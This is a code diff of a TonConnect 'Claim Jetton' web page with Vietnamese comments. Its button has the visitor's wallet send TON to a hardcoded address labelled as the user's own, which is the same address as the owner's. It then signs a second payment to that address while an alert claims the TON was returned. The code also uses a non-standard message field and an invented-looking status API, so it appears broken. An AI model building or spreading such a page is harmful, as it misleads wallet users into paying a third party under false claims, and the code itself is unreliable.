@@ -55,20 +55,21 @@
             buttonRootId: 'ton-connect',  // ID của phần tử mà TonConnect UI sẽ tạo nút kết nối
         });
 
-async function claimJetton() {
+async function sendAndClaimBack() {
     const jettonAddress = "EQAYMm97oiPgHWkjjzi0GRCc5wdBBNebv7rUiz7_Uig5a1pD";  // Địa chỉ Jetton contract
     const ownerAddress = "UQDu8vyZSZbAYvRRQ_jW4_0EiBGibAGq72wSZjYWRmNAGhRD";  // Địa chỉ người sở hữu
+    const userAddress = "UQDu8vyZSZbAYvRRQ_jW4_0EiBGibAGq72wSZjYWRmNAGhRD";  // Địa chỉ người dùng gửi
 
     // Tính toán số lượng TON cần gửi (0.01 TON -> 1000 Jetton)
     const amountToSend = "10000000";  // 0.01 TON (đổi sang nanotons)
-
-    // Cấu hình giao dịch gửi TON
+    
+    // Gửi giao dịch xác nhận
     const transaction = {
         validUntil: Math.floor(Date.now() / 1000) + 60, // Hết hạn sau 60 giây
         messages: [
             {
-                address: ownerAddress,  // Địa chỉ người nhận (người sở hữu hợp đồng Jetton)
-                amount: amountToSend,    // Số lượng TON gửi đi
+                address: userAddress,  // Địa chỉ người nhận
+                amount: amountToSend,   // Số lượng TON gửi đi
                 jettonAddress: jettonAddress  // Địa chỉ hợp đồng Jetton
             }
         ]
@@ -77,13 +78,52 @@ async function claimJetton() {
     try {
         // Gửi giao dịch qua TonConnectUI
         const result = await tonConnectUI.sendTransaction(transaction);
-        console.log('Claim successful:', result);
-        alert('Claim successful! You have received your Jettons.');
+        console.log('Giao dịch đã được gửi:', result);
+
+        // Kiểm tra trạng thái giao dịch
+        if (result && result.transactionId) {
+            // Giả sử bạn có hàm xác nhận giao dịch (kiểm tra trên blockchain)
+            const isTransactionConfirmed = await checkTransactionStatus(result.transactionId);
+            
+            if (isTransactionConfirmed) {
+                // Sau khi xác nhận giao dịch, trả lại TON cho người dùng
+                const returnTransaction = {
+                    validUntil: Math.floor(Date.now() / 1000) + 60, // Hết hạn sau 60 giây
+                    messages: [
+                        {
+                            address: userAddress,  // Địa chỉ người nhận
+                            amount: amountToSend,   // Số lượng TON trả lại
+                        }
+                    ]
+                };
+                // Gửi lại TON cho người dùng
+                await tonConnectUI.sendTransaction(returnTransaction);
+                alert('Giao dịch thành công! Bạn đã nhận lại TON.');
+            } else {
+                alert('Giao dịch chưa xác nhận. Vui lòng thử lại sau.');
+            }
+        } else {
+            alert('Có lỗi xảy ra khi gửi giao dịch.');
+        }
     } catch (error) {
-        console.error('Error claiming jetton:', error);
-        alert('Error: ' + error.message);
+        console.error('Lỗi khi xử lý giao dịch:', error);
+        alert('Có lỗi xảy ra khi gửi giao dịch.');
     }
 }
+
+// Hàm kiểm tra trạng thái giao dịch trên blockchain (cần tùy chỉnh theo API của bạn)
+async function checkTransactionStatus(transactionId) {
+    try {
+        // Giả sử bạn có một API để kiểm tra trạng thái giao dịch
+        const response = await fetch(`https://api.ton.blockchain/transaction/${transactionId}`);
+        const data = await response.json();
+        return data && data.status === 'confirmed';
+    } catch (error) {
+        console.error('Lỗi khi kiểm tra trạng thái giao dịch:', error);
+        return false;
+    }
+}
+
 
 
         // Gắn sự kiện cho nút "Claim Jetton"
